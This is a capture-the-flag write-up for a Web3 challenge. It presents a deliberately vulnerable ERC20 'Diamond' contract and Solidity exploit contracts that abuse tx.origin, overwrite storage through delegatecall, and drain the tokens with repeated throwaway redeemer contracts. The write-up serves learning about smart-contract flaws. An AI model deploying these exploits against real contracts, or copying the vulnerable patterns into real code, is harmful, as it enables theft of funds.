# Diamond - Web3

## Challenge

We get one contract of a ERC20 token, and want to get all of it out of the contract.

```solidity
// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.17;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// The following contract is vulnerable on purpose: DO NOT COPY AND USE IT ON MAINNET!
contract Diamond is ERC20("Diamond", "DMD") {
    address private manager;
    address private extension;
    mapping(address => bool) private redeemers;
    uint256 private bonusRedeemsLeft = 5;
    uint256 private constant diamond = 10 ** 18; // 18 is the default decimals number

    constructor() {
        manager = msg.sender;
        _mint(address(this), 1000 * diamond);
    }

    function recovery(address newManager) public {
        require(tx.origin == manager);
        manager = newManager;
    }

    function getFirstRedeemerBonus() public {
        require(bonusRedeemsLeft > 0);
        require(redeemers[msg.sender] == false);
        bonusRedeemsLeft -= 1;
        redeemers[msg.sender] = true;
        bool success = this.transfer(msg.sender, 5 * diamond);
        require(success);
    }

    function setExtension(address newExtension) public {
        require(msg.sender == manager);
        extension = newExtension;
    }

    function callExtension(bytes memory _data) public {
        (bool success, ) = extension.delegatecall(_data);
        require(success);
    }
}
```

## Solution

The vulnerability is the use of tx origin. Through the faucet, which has the same address as the owner we can forward the message to the recovery() function and set ourself to the manager. I used this contract to do that, by deploying it and then calling the faucet with its address.

```solidity
// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.17;

import "Diamond.sol";

contract restter
{
    Diamond target;

    constructor(address _target) {
        target = Diamond(_target);
    }

    receive() payable external
    {
        target.recovery(0xYourAddress);
    }
}
```

Now that you're the manager you can call setExtension() to set it to your own extension. I deployed the following contract and then set the extension to it's address.

```solidity
// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.17;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract extension is ERC20("Diamond", "DMD")
{
    address public manager;
    address public extension;
    mapping(address => bool) private redeemers;
    uint256 public bonusRedeemsLeft;
    uint256 private constant diamond = 10 ** 18;

    function attack() public 
    {
        bonusRedeemsLeft = 69420;
    }
}

```

Now you have to call that extension through the callExtension() function. You could've probably also done that directly from your address, but i wrote a small contract that does it for you.

```solidity
// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.17;

import "Diamond.sol";
import "extension.sol";

contract redeemsOverwriter
{
    Diamond target;

    constructor(address _target) {
        target = Diamond(_target);
        target.callExtension(abi.encodeWithSelector(extension.attack.selector));
    }
}

```

Now that the max amount of free redeems is super high you can start draining the contract. As it only checks if your address has already requested one free redeem, you can just create arbitrary contracts and send the money back to you. I created one small contract that requests a free redeem and then sends it back to you.

```solidity
// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.17;

import "./Diamond.sol";

contract drainer
{
    Diamond target;

    constructor(address _target) {
        target = Diamond(_target);
        target.getFirstRedeemerBonus();
        target.transfer(0x2C17A5f47FF94Be930E74483BDa8FE0D3616AA1E, 5);
    }
}
```

As i would have needed to call this script 200 times i wrote a big drainer that just does it 20x as fast.

```solidity
// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.17;

import "./drainer.sol";

contract bigDrainer
{
    Diamond target;

    constructor(address _target) {
        for (int i = 0; i <20; i++)
        {
            new drainer(_target);
        }
    }
}
```

Now i just created this contract 10x, and i had all the money.

--> Flag

